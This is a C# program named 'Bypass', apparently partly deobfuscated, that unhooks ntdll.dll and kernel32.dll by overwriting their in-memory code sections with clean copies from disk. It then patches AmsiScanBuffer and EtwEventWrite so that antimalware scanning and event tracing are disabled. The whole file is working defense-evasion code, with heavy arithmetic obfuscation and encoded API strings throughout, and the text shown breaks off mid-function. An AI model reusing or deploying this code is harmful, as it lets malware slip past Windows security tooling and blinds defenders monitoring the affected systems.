using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

internal class Bypass
{
    public struct ModuleInfo
    {
        public IntPtr BaseOfDll;

        public uint SizeOfImage;

        public IntPtr EntryPoint;
    }

    const uint GENERIC_READ = 0x80000000u;

    const uint FILE_SHARE_READ = 1u;

    const uint OPEN_EXISTING = 3;

    const uint SEC_IMAGE = 0x1000000;

    const uint PAGE_READONLY = 0x02;

    const uint PAGE_EXECUTE_READWRITE = 64u;

    private delegate bool CloseHandleDelegate(IntPtr handle);

    private delegate bool FreeLibraryDelegate(IntPtr module);

    private delegate int VirtualProtectDelegate(IntPtr address, IntPtr size, uint newProtect, out uint oldProtect);

    private delegate IntPtr CreateFileADelegate(string fileName, uint desiredAccess, uint shareMode, IntPtr securityAttributes, uint creationDisposition, uint flagsAndAttributes, IntPtr templateFile);

    private delegate IntPtr CreateFileMappingADelegate(IntPtr file, IntPtr fileMappingAttributes, uint protect, uint maximumSizeHigh, uint maximumSizeLow, string name);

    private delegate IntPtr MapViewOfFileDelegate(IntPtr fileMappingObject, uint desiredAccess, uint fileOffsetHigh, uint fileOffsetLow, IntPtr numberOfBytesToMap);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate IntPtr MemcpyDelegate(IntPtr dest, IntPtr src, IntPtr count);

    private delegate bool GetModuleInformationDelegate(IntPtr process, IntPtr module, out ModuleInfo moduleInfo, uint size);

    private delegate bool IsWow64ProcessDelegate([In] IntPtr hProcess, out bool wow64Process);

    private static Process CurrentProcess = Process.GetCurrentProcess();

    //private static ZNmDcyncvf znmDcyncvf_0 = Marshal.GetDelegateForFunctionPointer<ZNmDcyncvf>(GetProcAddress(Module.smethod_0("\ue53b\ue535\ue542\ue53e\ue535\ue53c\ue503\ue502\ue4fe\ue534\ue53c\ue53c", Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(594087686, Math.Abs(int.MaxValue)))))))))))))))), -1635916592, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(892317420, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(67566944, Math.Abs(int.MaxValue)))))))))))))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(791549429, Math.Abs(int.MaxValue))))))))))))))))))))))), Module.smethod_0("\uee29\uee52\uee55\uee59\uee4b\uee2e\uee47\uee54\uee4a\uee52\uee4b", Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(975641587, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))), -746983962, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(428161278, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(738607515, Math.Abs(int.MaxValue)))))))))))))))))))))))), -215196535)));
    private static CloseHandleDelegate CloseHandle = Marshal.GetDelegateForFunctionPointer<CloseHandleDelegate>(GetProcAddress("kernel32.dll", "CloseHandle"));

    //private static UqmsIGqMLT uqmsIGqMLT_0 = Marshal.GetDelegateForFunctionPointer<UqmsIGqMLT>(GetProcAddress(Module.smethod_0("⯔⯎⯛⯗⯎⯕⮜⮛⮗⯍⯕⯕", Math.Abs(-(-(-(-(-(-(-(-(-(-Math.Min(2123743014, Math.Abs(int.MaxValue)))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-Math.Min(478882665, Math.Abs(int.MaxValue)))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(949169746, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(400223489, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(387286290, Math.Abs(int.MaxValue))))))))))))))))))))))))))))))))))))), Module.smethod_0("箩篕篈篈箯篌篅篕範篕篜", Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(602495302, Math.Abs(int.MaxValue)))))))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1048345443, Math.Abs(int.MaxValue)))))))))))))))))))))), -1538517407, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1962145170, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(271354630, Math.Abs(int.MaxValue)))))))))))))))))))))))));
    private static FreeLibraryDelegate FreeLibrary = Marshal.GetDelegateForFunctionPointer<FreeLibraryDelegate>(GetProcAddress("kernel32.dll", "FreeLibrary"));

    //private static cTPkEXFRYN cTPkEXFRYN_0 = Marshal.GetDelegateForFunctionPointer<cTPkEXFRYN>(GetProcAddress(Module.smethod_0("ᗏᗉᗖᗒᗉᗐᖗᖖᖒᗈᗐᗐ", -1689601818, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1733891428, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))), -789671474, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(963803759, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))), -1230683948), Module.smethod_0("槉槜槥槧槨槔槟槃槥槢槧様槖槧", -1949029339, -257463949, -1079179783, -1755171048, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1131603227, Math.Abs(int.MaxValue)))))))))))))))))))))))))));
    private static VirtualProtectDelegate VirtualProtect = Marshal.GetDelegateForFunctionPointer<VirtualProtectDelegate>(GetProcAddress("kernel32.dll", "VirtualProtect"));

    //private static rITlYTqlap rITlYTqlap_0 = Marshal.GetDelegateForFunctionPointer<rITlYTqlap>(GetProcAddress(Module.smethod_0("墧墡墮墪墡墨塯塮塪墠墨墨", Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(63452561, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-Math.Min(1286297660, Math.Abs(int.MaxValue)))))))))))), -1950141147, -1471806060, -873500965), Module.smethod_0("ꝪꞙꞌꞈꞛꞌꝭꞐꞓꞌꝨ", -340470500, -1025595609, -2068782683, -552476429, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(516391522, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))));
    private static CreateFileADelegate CreateFileA = Marshal.GetDelegateForFunctionPointer<CreateFileADelegate>(GetProcAddress("kernel32.dll", "CreateFileA"));

    //private static FWqcHEJrFU fwqcHEJrFU_0 = Marshal.GetDelegateForFunctionPointer<FWqcHEJrFU>(GetProcAddress(Module.smethod_0("虔虎虛虗虎處蘜蘛蘗虍處處", -383380995, -268925463, -135004117, -668630673, -1736083014), Module.smethod_0("댓덂댵댱덄댵댖댹댼댵댝댱덀덀댹댾댷댑", Math.Abs(-(-(-(-(-(-(-(-(-(-Math.Min(1378822589, Math.Abs(int.MaxValue)))))))))))), -1769229616, -1317384018, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(747401969, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(466512390, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))));
    private static CreateFileMappingADelegate CreateFileMappingA = Marshal.GetDelegateForFunctionPointer<CreateFileMappingADelegate>(GetProcAddress("kernel32.dll", "CreateFileMappingA"));

    //private static HgsucgXcYe hgsucgXcYe_0 = Marshal.GetDelegateForFunctionPointer<HgsucgXcYe>(GetProcAddress(Module.smethod_0("ꦇ\ua981ꦎꦊ\ua981ꦈ\ua94f\ua94e\ua94a\ua980ꦈꦈ", Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1839955401, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))), -1916557028, Math.Abs(-(-(-(-(-(-(-(-(-(-Math.Min(597143904, Math.Abs(int.MaxValue)))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1193236693, Math.Abs(int.MaxValue)))))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1631098764, Math.Abs(int.MaxValue))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))), Module.smethod_0("튝튱틀튦특튵틇튟튶튖특튼튵", -1373634299, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1693766224, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(873140669, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))), -2048965626, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1758302285, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))));
    private static MapViewOfFileDelegate MapViewOfFile = Marshal.GetDelegateForFunctionPointer<MapViewOfFileDelegate>(GetProcAddress("kernel32.dll", "MapViewOfFile"));

    //private static TwdHOmwbuP twdHOmwbuP_0 = Marshal.GetDelegateForFunctionPointer<TwdHOmwbuP>(GetProcAddress(Module.smethod_0("皯皵皸皥皴皶癰皦皮皮", -1579980023, -200444350, -1141132677, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1455959569, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(201288374, Math.Abs(int.MaxValue))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))), Module.smethod_0("詟詗詟評詢詫", -1316065979, -849835534, Math.Abs(-(-(-(-(-(-(-(-(-(-Math.Min(1080670125, Math.Abs(int.MaxValue)))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1308672498, Math.Abs(int.MaxValue)))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1865351338, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))));
    private static MemcpyDelegate Memcpy = Marshal.GetDelegateForFunctionPointer<MemcpyDelegate>(GetProcAddress("msvcrt.dll", "memcpy"));

    //private static qfLwnfCMCa qfLwnfCMCa_0 = Marshal.GetDelegateForFunctionPointer<qfLwnfCMCa>(GetProcAddress(Module.smethod_0("⼺⼽⼫⼺⼳\u2ef8⼮⼶⼶", Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1947395710, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))), Math.Abs(-(-(-(-(-(-(-(-Math.Min(1611804362, Math.Abs(int.MaxValue)))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(2133254287, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1567267652, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))), -1139918923), Module.smethod_0("殬毊毙殲比毉毚毑毊殮毓毋比毗毒毆毙毎比毓", Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(646243459, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(170683237, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1113989546, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))), -389264949, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(2122165360, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))));
    private static GetModuleInformationDelegate GetModuleInfomation = Marshal.GetDelegateForFunctionPointer<GetModuleInformationDelegate>(GetProcAddress("psapi.dll", "GetModuleInformation"));

    //private static nnldgkpyjR nnldgkpyjR_0 = Marshal.GetDelegateForFunctionPointer<nnldgkpyjR>(GetProcAddress(Module.smethod_0("퇝퇗퇤퇠퇗퇞톥톤토퇖퇞퇞", Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(570138588, Math.Abs(int.MaxValue)))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(330617202, Math.Abs(int.MaxValue)))))))))))))))))))))))), -1698402367, -261327458, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(875829849, Math.Abs(int.MaxValue))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))), Module.smethod_0("⻯⼙\u2efd⼕⼝⻜⻚\u2ef6⼘⼕⼉⼋⼙⼙", -1203152725, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1020079782, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1411435944, Math.Abs(int.MaxValue)))))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(40182504, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))), Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(986452990, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))))));
    private static IsWow64ProcessDelegate IsWow64Process = Marshal.GetDelegateForFunctionPointer<IsWow64ProcessDelegate>(GetProcAddress("kernel32.dll", "IsWow64Process"));


    private unsafe static void Main()
    {
        Unhook("ntdll.dll");
        if (Environment.OSVersion.Version.Major >= 10 || IntPtr.Size == 8)
        {
            Unhook("kernel32.dll");
        }
        byte[] AmsiScanBufferOpCode = new byte[6] { 184, 87, 0, 7, 128, 195 };
        byte[] AmsiScanBufferOpCode64 = new byte[8] { 184, 87, 0, 7, 128, 194, 24, 0 };
        Hook("amsi.dll", "AmsiScanBuffer", AmsiScanBufferOpCode, AmsiScanBufferOpCode64);
        
        byte[] EtwEventWriteOpCode = new byte[1] { 195 };
        byte[] EtwEventWriteOpCode64 = new byte[3] { 194, 20, 0 };
        Hook("ntdll.dll", "EtwEventWrite", EtwEventWriteOpCode, EtwEventWriteOpCode64);
    }

    private unsafe static void Hook(string library, string procName, byte[] x86Bytes, byte[] x64Bytes)
    {
        try
        {
            IntPtr procAddress = GetProcAddress(library, procName);
            if (procAddress == IntPtr.Zero)
            {
                throw new Exception();
            }
            int size = IntPtr.Size;
            byte[] bytes = ((size != 8) ? x64Bytes : x86Bytes);
            VirtualProtect(procAddress, (IntPtr)bytes.Length, PAGE_EXECUTE_READWRITE, out var oldProtect);
            Marshal.Copy(bytes, 0, procAddress, bytes.Length);
            VirtualProtect(procAddress, (IntPtr)bytes.Length, oldProtect, out oldProtect);
        }
        catch
        {
        }
    }

    private unsafe static void Unhook(string library)
    {
        try
        {
            IsWow64Process(CurrentProcess.Handle, out var wow64Process);
            //string text = Module.smethod_0("ⱻⱲⲔⲏⲡⲦⲜⲧⲯⲫⲔⲋⲱⲫⲬⲝⲥⱫⱪⲔ", num, -809751496, -1371012344, -14501290, -490435237);
            string text = "C:\\Windows\\System32\\";
            if (wow64Process && IntPtr.Size == 4)
            {
                //text = Module.smethod_0("￢\uffd9\ufffb\ufff6\b\r\u0003\u000e\u0016\u0012\ufffb\ufff2\u0018\u0012\ufff6￮\ufff6ￕￓ\ufffb", -1027412706, -316211297, -984637681, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1193756153, Math.Abs(int.MaxValue)))))))))))))), -565892715);
                text = "C:\\Windows\\SysWOW64\\";
            }
            IntPtr baseAddress = LoadLibrary(library);
            if (baseAddress == IntPtr.Zero || !GetModuleInfomation(CurrentProcess.Handle, baseAddress, out var moduleInfo, (uint)sizeof(ModuleInfo)))
            {
                return;
            }
            IntPtr file = CreateFileA(text + library, GENERIC_READ, FILE_SHARE_READ, IntPtr.Zero, OPEN_EXISTING, 0u, IntPtr.Zero);
            if (file == (IntPtr)(-1))
            {
                CloseHandle(file);
                return;
            }
            //IntPtr intPtr3 = CreateFileMappingA(intPtr2, IntPtr.Zero, (uint)Math.Abs(-(-(-(-(-(-(-(-Math.Min(16777218, Math.Abs(int.MaxValue)))))))))), 0u, 0u, null);
            IntPtr mapFile = CreateFileMappingA(file, IntPtr.Zero, SEC_IMAGE | PAGE_READONLY, 0u, 0u, null);
            if (mapFile == IntPtr.Zero)
            {
                CloseHandle(mapFile);
                return;
            }
            //IntPtr intPtr4 = MapViewOfFile(intPtr3, (uint)Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(4, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))), 0u, 0u, IntPtr.Zero);
            IntPtr mapAddress = MapViewOfFile(mapFile, 4u, 0u, 0u, IntPtr.Zero);
            if (mapAddress == IntPtr.Zero)
            {
                return;
            }
            int num2 = Marshal.ReadInt32((IntPtr)((long)moduleInfo.BaseOfDll + 60));
            short num3 = Marshal.ReadInt16((IntPtr)((long)baseAddress + num2 + 6));
            short num4 = Marshal.ReadInt16(baseAddress, num2 + 20);
            short num5 = 0;
            while (num5 < num3)
            {
                IntPtr p = (IntPtr)((long)baseAddress + num2 + 24 + num4 + num5 * 40);
                if (Marshal.ReadByte(p) != 46 || Marshal.ReadByte((IntPtr)((long)p + 1)) != 116 || Marshal.ReadByte((IntPtr)((long)p + 2)) != 101 || Marshal.ReadByte((IntPtr)((long)p + 3)) != 120 || Marshal.ReadByte((IntPtr)((long)p + 4)) != 116)
                {
                    num5 = num5++;
                    continue;
                }
                int offset = Marshal.ReadInt32((IntPtr)((long)p + 12));
                uint size = (uint)Marshal.ReadInt32((IntPtr)((long)p + 8));
                VirtualProtect((IntPtr)((long)baseAddress + offset), (IntPtr)size, PAGE_EXECUTE_READWRITE, out var oldProtect);
                Memcpy((IntPtr)((long)baseAddress + offset), (IntPtr)((long)mapAddress + offset), (IntPtr)size);
                VirtualProtect((IntPtr)((long)baseAddress + offset), (IntPtr)size, oldProtect, out oldProtect);
                break;
            }
            CloseHandle(mapFile);
            CloseHandle(file);
            FreeLibrary(baseAddress);
        }
        catch
        {
        }
    }

    public static IntPtr GetProcAddress(string library, string procName)
    {
        return GetProcAddressEx(LoadLibrary(library), procName);
    }

    public static IntPtr LoadLibrary(string library)
    {
        ProcessModuleCollection modules = CurrentProcess.Modules;
        foreach (ProcessModule item in modules)
        {
            if (item.FileName.ToLower().EndsWith(library.ToLower()))
            {
                return item.BaseAddress;
            }
        }
        return IntPtr.Zero;
    }

    public unsafe static IntPtr GetProcAddressEx(IntPtr library, string procName)
    {
        IntPtr intPtr = IntPtr.Zero;
        try
        {
            long num = library.ToInt64();
            Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(60, Math.Abs(int.MaxValue))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))));
            int num2 = Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(52, Math.Abs(int.MaxValue))))))))))))))));
            if ((-2131010233 ^ Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1169289691, Math.Abs(int.MaxValue))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))) == -984961892)
            {
                Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(2, Math.Abs(int.MaxValue))))))))))))))))))))))))))))))))))))))))))))))))))))));
                num2 += sizeof(ulong);
            }
            int num3 = Marshal.ReadInt32((IntPtr)(num + num2));
            Marshal.ReadInt16((IntPtr)(library.ToInt64() + num3 + Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(20, Math.Abs(int.MaxValue))))))))))))))))))))))))))))))))))));
            long num4 = library.ToInt64() + num3 + Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(24, Math.Abs(int.MaxValue))))))))))))))))))))))));
            short num5 = Marshal.ReadInt16((IntPtr)num4);
            long num6 = 0L;
            num6 = ((num5 != Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(267, Math.Abs(int.MaxValue))))))))))))))))))))))))))))))))))))))))))))))))))))))))) ? (num4 + Math.Abs(-(-(-(-(-(-(-(-(-(-Math.Min(112, Math.Abs(int.MaxValue))))))))))))) : (num4 + Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(96, Math.Abs(int.MaxValue))))))))))))))))))))))))))))));
            int num7 = Marshal.ReadInt32((IntPtr)num6);
            int num8 = Marshal.ReadInt32((IntPtr)(library.ToInt64() + num7 + Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(16, Math.Abs(int.MaxValue))))))))))))))))))))))))))))))));
            Marshal.ReadInt32((IntPtr)(library.ToInt64() + num7 + Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(20, Math.Abs(int.MaxValue))))))))))))))))))))))))))))))))))))))))))))))))))))))))));
            int num9 = Marshal.ReadInt32((IntPtr)(library.ToInt64() + num7 + Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(24, Math.Abs(int.MaxValue))))))))))))))))))))))))))))))))))))));
            int num10 = Marshal.ReadInt32((IntPtr)(library.ToInt64() + num7 + Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(28, Math.Abs(int.MaxValue))))))))))))))))))))))))))))))))))))))))))));
            int num11 = Marshal.ReadInt32((IntPtr)(library.ToInt64() + num7 + Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(32, Math.Abs(int.MaxValue))))))))))))))))))))))))))))))))));
            int num12 = Marshal.ReadInt32((IntPtr)(library.ToInt64() + num7 + Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(36, Math.Abs(int.MaxValue))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))));
